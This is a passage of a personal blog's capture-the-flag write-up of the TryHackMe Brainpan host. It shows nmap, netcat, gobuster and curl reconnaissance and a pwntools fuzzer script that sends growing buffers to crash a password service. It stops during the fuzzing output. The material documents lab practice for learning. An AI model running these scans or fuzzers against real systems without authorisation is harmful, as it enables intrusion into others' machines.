<!doctype html><html lang=en-us><head><title>Brainpan Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Brainpan1 host from TryHackMe."><meta name=generator content="Hugo 0.110.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/tags>Tags</a>
<a href=/about>About</a>
<a href=/projects>Projects</a>
<a href=/misc>Misc</a>
<a class=button href=https://ncatelli.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Brainpan Boot2Root Write-Up</h1><div class=tip><time datetime="2020-12-22 00:00:00 +0000 UTC">Dec 22, 2020</time>
<span class=split>¬∑</span>
<span>4170 words</span>
<span class=split>¬∑</span>
<span>20 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attack>Attack</a><ul><li><a href=#host-enumeration>Host enumeration</a></li><li><a href=#enumerating-the-webserver>Enumerating the webserver</a></li><li><a href=#pwning-brainpan>Pwning brainpan</a></li><li><a href=#getting-a-shell-on-the-target>Getting a shell on the target</a></li><li><a href=#enumerating-the-host>Enumerating the Host</a></li><li><a href=#stabilizing-my-limited-shell-to-a-full-tty>Stabilizing my limited shell to a full TTY</a></li><li><a href=#enumerating-the-linux-target>Enumerating the linux target</a></li><li><a href=#building-dirtycow>Building dirtycow</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></div></details></aside><div class=content><h2 id=introduction>Introduction <a href=#introduction class=anchor>üîó</a></h2><p>Brainpan was an interesting challenge as it had many pivots and took hours over the span of two days to complete. I found that I quickly gained access to the host but was stuck trying to find a way to excalate an unprivileged account to root. Local scans made it seem like there maybe were a few ways to reach root though I ended up achieving the escalation via a kernel exploit that I&rsquo;d never had the opportunity to attempt yet.</p><h2 id=environment>Environment <a href=#environment class=anchor>üîó</a></h2><p>The attack took place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target. I knew there would most likely be a buffer overflow exploit that would need to be exploited going into this attack, at some point, but little else.</p><h2 id=attack>Attack <a href=#attack class=anchor>üîó</a></h2><p>Prior to starting the attack, I prepared my workstation by setting up burpsuite, including installing the requisite certificates in firefox. In addition, I also installed <code>jq</code>, <a href=https://github.com/OJ/gobuster target=_blank rel=noopener>gobuster</a> and the <a href=https://github.com/danielmiessler/SecLists target=_blank rel=noopener>seclists</a> wordlist collections.</p><h3 id=host-enumeration>Host enumeration <a href=#host-enumeration class=anchor>üîó</a></h3><p>I started the attack by running Connect, Version and OS scans against the host which identified only 2 open ports. One appeared to be an http server. However the other looked to be an unidentified TCP serice that was prompting for input.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# nmap -sC -sV -Pn -O 10.10.42.127
</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-12-23 02:35 UTC
</span></span><span style=display:flex><span>root@kali:~/ctf# nmap -sC -sV -Pn -O 10.10.42.127
</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-12-23 02:35 UTC
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-112-152.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.42.127<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00043s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT      STATE SERVICE VERSION
</span></span><span style=display:flex><span>9999/tcp  open  abyss?
</span></span><span style=display:flex><span>| fingerprint-strings:
</span></span><span style=display:flex><span>|   NULL:
</span></span><span style=display:flex><span>|     _| _|
</span></span><span style=display:flex><span>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
</span></span><span style=display:flex><span>|     _|_| _| _| _| _| _| _| _| _| _| _| _|
</span></span><span style=display:flex><span>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
</span></span><span style=display:flex><span>|     <span style=color:#f92672>[</span>________________________ WELCOME TO BRAINPAN _________________________<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>|_    ENTER THE PASSWORD
</span></span><span style=display:flex><span>10000/tcp open  http    SimpleHTTPServer 0.6 <span style=color:#f92672>(</span>Python 2.7.3<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                                                                                SF-Port9999-TCP:V<span style=color:#f92672>=</span>7.80%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>12/23%Time<span style=color:#f92672>=</span>5FE2ACFE%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>N                                                                                            SF:ULL,298,<span style=color:#e6db74>&#34;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>MAC Address: 02:65:A0:1B:B0:DD <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>TCP/IP fingerprint:
</span></span><span style=display:flex><span>OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.80%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>12/23%OT<span style=color:#f92672>=</span>9999%CT<span style=color:#f92672>=</span>1%CU<span style=color:#f92672>=</span>36762%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>1%DC<span style=color:#f92672>=</span>D%G<span style=color:#f92672>=</span>Y%M<span style=color:#f92672>=</span>0265A
</span></span><span style=display:flex><span>OS:0%TM<span style=color:#f92672>=</span>5FE2AD36%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>106%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>10C%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%I
</span></span><span style=display:flex><span>OS:I<span style=color:#f92672>=</span>I%TS<span style=color:#f92672>=</span>8<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>O1<span style=color:#f92672>=</span>M2301ST11NW7%O2<span style=color:#f92672>=</span>M2301ST11NW7%O3<span style=color:#f92672>=</span>M2301NNT11NW7%O4<span style=color:#f92672>=</span>M2301ST
</span></span><span style=display:flex><span>OS:11NW7%O5<span style=color:#f92672>=</span>M2301ST11NW7%O6<span style=color:#f92672>=</span>M2301ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>45EA%W2<span style=color:#f92672>=</span>45EA%W3<span style=color:#f92672>=</span>45EA%W4<span style=color:#f92672>=</span>45EA%W
</span></span><span style=display:flex><span>OS:5<span style=color:#f92672>=</span>45EA%W6<span style=color:#f92672>=</span>45EA<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>4602%O<span style=color:#f92672>=</span>M2301NNSNW7%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>OS:Y%T<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%
</span></span><span style=display:flex><span>OS:F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y
</span></span><span style=display:flex><span>OS:%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%R
</span></span><span style=display:flex><span>OS:D<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>I
</span></span><span style=display:flex><span>OS:E<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>S<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>1</span> hop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https:/
</span></span><span style=display:flex><span>/nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 64.84 seconds
</span></span></code></pre></div><p>To satisfy my curiosity, I connected to this service with <code>netcat</code> and found an interface that prompted for a password. I fed it a test password and was denied access and disconnected.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# nc 10.10.42.127 <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span>_|                            _|
</span></span><span style=display:flex><span>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
</span></span><span style=display:flex><span>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span></span><span style=display:flex><span>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span></span><span style=display:flex><span>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
</span></span><span style=display:flex><span>                                            _|
</span></span><span style=display:flex><span>                                            _|
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>________________________ WELCOME TO BRAINPAN _________________________<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>                          ENTER THE PASSWORD
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                          &gt;&gt; test
</span></span><span style=display:flex><span>                          ACCESS DENIED
</span></span><span style=display:flex><span>root@kali:~/ctf#
</span></span></code></pre></div><p>While I knew there had to be more here, I had a feeling this could potentially be a rabbit hole without more information. I decided to crawl the webserver to see if I could learn anything more about the target before focusing on this any longer.</p><h3 id=enumerating-the-webserver>Enumerating the webserver <a href=#enumerating-the-webserver class=anchor>üîó</a></h3><p>I opened site index to find a single image and little else.</p><p><p class=markdown-image><img src=/images/brainpan_http_index.png alt="brainpan http index"></p></p><p>Probing around for an <code>robots.txt</code> or other common directories yielded nothing so I decided to run <code>gobuster</code> against the webserver with the <code>directories-2.3-medium.txt</code> wordlist to see if I could identify any less common directory names.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# gobuster dir -u <span style=color:#e6db74>&#39;http://10.10.42.127:10000/&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/
</span></span><span style=display:flex><span>Display all <span style=color:#ae81ff>128</span> possibilities? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# gobuster dir -u <span style=color:#e6db74>&#39;http://10.10.42.127:10000/&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.0.1
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@_FireFart_<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:            http://10.10.42.127:10000/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:        <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:     gobuster/3.0.1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:        10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2020/12/23 02:49:07 Starting gobuster
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/bin <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2020/12/23 02:50:12 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>The scan returned a single directory, <code>/bin/</code> which contained a single executable file. Given the name of the file, I assumed this was the executable for the <code>brainpan</code> service running on port <code>9999</code> and given that it was a 32-bit windows executable, assumed that I would be attacking a windows host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# curl -sD - <span style=color:#e6db74>&#39;http://10.10.42.127:10000/bin/&#39;</span>
</span></span><span style=display:flex><span>HTTP/1.0 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Server: SimpleHTTP/0.6 Python/2.7.3
</span></span><span style=display:flex><span>Date: Wed, <span style=color:#ae81ff>23</span> Dec <span style=color:#ae81ff>2020</span> 02:51:02 GMT
</span></span><span style=display:flex><span>Content-type: text/html; charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>230</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!DOCTYPE html PUBLIC <span style=color:#e6db74>&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;&lt;html&gt;
</span></span><span style=display:flex><span>&lt;title&gt;Directory listing <span style=color:#66d9ef>for</span> /bin/&lt;/title&gt;
</span></span><span style=display:flex><span>&lt;body&gt;
</span></span><span style=display:flex><span>&lt;h2&gt;Directory listing <span style=color:#66d9ef>for</span> /bin/&lt;/h2&gt;
</span></span><span style=display:flex><span>&lt;hr&gt;
</span></span><span style=display:flex><span>&lt;ul&gt;
</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;brainpan.exe&#34;</span>&gt;brainpan.exe&lt;/a&gt;
</span></span><span style=display:flex><span>&lt;/ul&gt;
</span></span><span style=display:flex><span>&lt;hr&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;
</span></span><span style=display:flex><span>&lt;/html&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# curl -sO <span style=color:#e6db74>&#39;http://10.10.42.127:10000/bin/brainpan.exe&#39;</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# file brainpan.exe 
</span></span><span style=display:flex><span>brainpan.exe: PE32 executable <span style=color:#f92672>(</span>console<span style=color:#f92672>)</span> Intel <span style=color:#ae81ff>80386</span> <span style=color:#f92672>(</span>stripped to external PDB<span style=color:#f92672>)</span>, <span style=color:#66d9ef>for</span> MS Windows
</span></span></code></pre></div><h3 id=pwning-brainpan>Pwning brainpan <a href=#pwning-brainpan class=anchor>üîó</a></h3><p>Knowing there was a buffer overflow somewhere in this challege, I worked under the assumption that this was enough evidence to start investigating the <code>brainpan.exe</code> binary for a vulnerability that I could use to make any futher progress onto the host. To facilitate this, I decided to setup an environment to begin fuzzing the service.</p><h4 id=setting-up-a-testing-environment>Setting up a testing environment <a href=#setting-up-a-testing-environment class=anchor>üîó</a></h4><p>I began by spinning up a Windows 7 VM with a host interface so I could easily interact with it from my attack host. I then installed Immunity Debugger, and <a href=https://github.com/corelan/mona target=_blank rel=noopener>mona</a> as I assumed that there would be a buffer overflow in the input field of the service.</p><p><p class=markdown-image><img src=/images/brainpan_immunity_debugger.png alt="immunity debugger"></p></p><p>Finally, I setup a project directory in mona with <code>!mona config -set workingfolder c:\mona\%p</code> and confirmed that I could hit the local brainpan service with netcat via <code>nc 192.168.0.14 9999</code>.</p><h4 id=fuzzing-brainpan>Fuzzing brainpan <a href=#fuzzing-brainpan class=anchor>üîó</a></h4><p>To start crafting the exploit, I opened up a shell in a <code>python:3</code> docker image and installed <code>pwntools</code>. I then created the following fuzzer script to iterate over sending an increasingly long payload to the input prompt of the brainpan service with the hope of coaxing it to crash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys<span style=color:#f92672>,</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context vars</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target</span>
</span></span><span style=display:flex><span>ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;192.168.0.14&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;9999&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>
</span></span><span style=display:flex><span>iterations <span style=color:#f92672>=</span> <span style=color:#ae81ff>30</span>
</span></span><span style=display:flex><span>buffer <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> counter <span style=color:#f92672>*</span> i <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, iterations <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> buf <span style=color:#f92672>in</span> buffer:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        target <span style=color:#f92672>=</span> remote(ip, port, typ<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;tcp&#39;</span>)
</span></span><span style=display:flex><span>        target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;&gt;&gt; &#34;</span>)
</span></span><span style=display:flex><span>        log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sending payload of </span><span style=color:#e6db74>{</span>len(buf)<span style=color:#e6db74>}</span><span style=color:#e6db74> bytes&#34;</span>)
</span></span><span style=display:flex><span>        target<span style=color:#f92672>.</span>sendline(buf)
</span></span><span style=display:flex><span>        target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        target<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Could not connect to </span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@00e35ba5ecd5:~# python3 fuzzer.py 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>100</span> bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to 192.168.0.14 port <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>200</span> bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to 192.168.0.14 port <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>300</span> bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to 192.168.0.14 port <span style=color:#ae81ff>9999</span>
